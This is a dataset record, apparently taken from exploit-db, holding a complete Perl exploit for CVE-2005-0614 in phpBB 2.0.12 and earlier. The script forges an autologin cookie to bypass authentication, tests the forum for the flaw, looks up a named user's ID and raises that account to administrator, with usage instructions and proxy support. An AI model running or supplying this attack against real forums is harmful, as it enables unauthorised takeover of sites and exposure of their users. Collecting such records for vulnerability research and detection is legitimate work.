{
  "id": "889",
  "title": "phpBB 2.0.12 - Change User Rights Authentication Bypass",
  "cve": "CVE-2005-0614",
  "vuln_type": "auth_bypass",
  "code": "#!/usr/bin/perl -w\r\n\r\n# phpBB <=2.0.12 session autologin exploit\r\n# This script uses the vulerability in autologinid variable \r\n# More: http://www.phpbb.com/phpBB/viewtopic.php?f=14&t=267563\r\n#\r\n# Just gives an user on vulnerable forum administrator rights.\r\n# You should register the user before using this ;-)\r\n \r\n#   by Kutas, kutas@mail15.com\r\n#P.S. I dont know who had made an original exploit, so I cannot place no (c) here...\r\n# but greets goes to Paisterist who made an exploit for Firefox cookies...\r\n\r\nif (@ARGV < 3)\r\n {\r\n print q(\r\n +++++++++++++++++++++++++++++++++++++++++++++++++++\r\n Usage: perl nenu.pl [site] [phpbb folder] [username] [proxy (optional)] \r\n i.e. perl nenu.pl www.site.com /forum/ BigAdmin 127.0.0.1:3128\r\n ++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n           );   \r\n exit;\r\n } \r\nuse strict;\r\nuse LWP::UserAgent;\r\n\r\nmy $host  = $ARGV[0];\r\nmy $path  = $ARGV[1];\r\nmy $user  = $ARGV[2];\r\nmy $proxy = $ARGV[3];\r\nmy $request = \"http://\";\r\n$request .= $host;\r\n$request .= $path; \r\n \r\n\r\nuse HTTP::Cookies;\r\nmy $browser = LWP::UserAgent->new ();\r\nmy $cookie_jar = HTTP::Cookies->new( );\r\n$browser->cookie_jar( $cookie_jar );\r\n$cookie_jar->set_cookie( \"0\",\"phpbb2mysql_data\", \"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D\", \"/\",$host,,,,,);\r\nif ( defined $proxy) {\r\n\t$proxy =~ s/(http:\\/\\/)//eg;\r\n\t$browser->proxy(\"http\" , \"http://$proxy\");\r\n }\r\n print \"++++++++++++++++++++++++++++++++++++\\n\";\r\n print \"Trying to connect to $host$path\"; if ($proxy) {print \"using proxy $proxy\";}\r\n\r\nmy $response = $browser->get($request);\r\ndie \"Error: \", $response->status_line\r\n unless $response->is_success;\r\n \r\nif($response->content =~ m/phpbbprivmsg/) {\r\n  print \"\\n   Forum is vulnerable!!!\\n\";\r\n} else {\r\n  print \"Sorry... Not vulnerable\"; exit();}\r\n\r\nprint \"+++++++++++++++++++++++++++++\\nTrying to get the user:$user ID...\\n\";\r\n$response->content =~ /sid=([\\w\\d]*)/;\r\nmy $sid = $1;\r\n\r\n$request .= \"admin\\/admin_ug_auth.php?mode=user&sid=$sid\";\r\n$response = $browser->post(\r\n  $request,\r\n  [\r\n    'username'  => $user,\r\n    'mode' => 'edit',\r\n    'mode' => 'user',\r\n    'submituser' => 'Look+up+User'\r\n  ],\r\n);\r\ndie \"Error: \", $response->status_line\r\n unless $response->is_success;\r\n\r\nif ($response->content =~ /name=\"u\" value=\"([\\d]*)\"/) \r\n\t{print \"   Done... ID=$1\\n++++++++++++++++++++++++++++++\\n\";}\r\n   else {print \"No user $user found...\"; exit(); }\t\r\nmy $uid = $1;\r\nprint \"Trying to give user:$user admin status...\\n\";\r\n\r\n$response = $browser->post(\r\n  $request,\r\n  [\r\n    'userlevel'  => 'admin',\r\n    'mode' => 'user',\r\n    'adv'=>'',\r\n    'u'=> $uid,\r\n    'submit'=> 'Submit'\r\n  ],\r\n);\r\ndie \"Error: \", $response->status_line\r\n unless $response->is_success;\r\nprint \"   Well done!!! $user should now have an admin status..\\n++++++++++++++++++++++++++++\";\r\n\r\n# milw0rm.com [2005-03-21]",
  "url": "https://www.exploit-db.com/exploits/889"
}